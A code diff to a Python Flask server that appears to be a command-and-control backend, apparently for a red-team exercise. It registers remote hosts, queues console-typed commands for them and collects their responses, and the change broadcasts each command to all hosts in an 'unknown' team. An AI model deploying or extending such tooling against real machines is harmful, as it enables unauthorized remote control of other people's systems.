@@ -53,7 +53,10 @@ def getCommands(identifier):
     """
     Returns a list of commands for the client to run
     """
-    return HOSTS[identifier].getQueuedCommands()
+    try:
+        return HOSTS[identifier].getQueuedCommands()
+    except:
+        return '{"command_count":"69420"}'
 
 @app.route("/hosts/<identifier>/responses", methods=["POST"])
 def getResponse(identifier):
@@ -85,7 +88,7 @@ def newHost():
     """
     global UNKNOWN_COUNT
     data = request.json
-    data = ast.literal_eval(data)
+    data = json.loads(data,strict=False)
     IP = data["IP"]
     OS = data["OS"]
     hostname,team = getInfoByIP(IP)
@@ -94,11 +97,9 @@ def newHost():
         checkIn(host_id)
         return f"{host_id}"
     if host_id == "unknown.unknown":
-        for i in range(0,UNKNOWN_COUNT+1):
-            temp_id = host_id + str(i)
-            if temp_id in HOSTS:
-                checkIn(temp_id)
-                return f"{temp_id}"
+        for host in HOSTS:
+            if HOSTS[host].ip == IP:
+                return host
     UNKNOWN_COUNT += 1
     newHost = Host(IP,OS,hostname,team)
     newHost.id += str(UNKNOWN_COUNT)
@@ -191,7 +192,9 @@ def main():
     website.start()
     while 1:
         command = input()
-        HOSTS["Ubuntu1.1"].addCommand(command)
+        # HOSTS["unknown.unknown1"].addCommand(command)
+        for host in TEAMS["unknown"].hosts:
+            host.addCommand(command)
 
 if __name__ == "__main__":
     main()
